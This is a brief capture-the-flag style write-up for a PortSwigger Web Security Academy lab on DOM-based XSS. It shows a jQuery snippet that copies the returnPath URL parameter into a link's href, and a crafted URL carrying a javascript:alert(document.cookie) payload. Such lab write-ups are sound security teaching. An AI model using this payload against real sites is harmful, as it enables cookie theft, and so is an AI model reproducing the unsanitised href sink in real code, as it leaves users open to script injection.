# Lab: DOM XSS in jQuery anchor href attribute sink using location.search source
# https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink

``` bash
# Go to Submit feedback page and after that inspect back button.

<a id="backLink" href="/">Back</a>
<script>$(function() {$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath')); }); </script>

# The .attr method is used to set or get attributes of HTML elements.
# it is used to set the href attribute of the selected element (#backLink).

# We extract the returnPath value and set it to the href attribute of the backLink.
```
```bash
# This was the url

https://....web-security-academy.net/feedback?returnPath=/

# We will change it 

https://....web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)
```
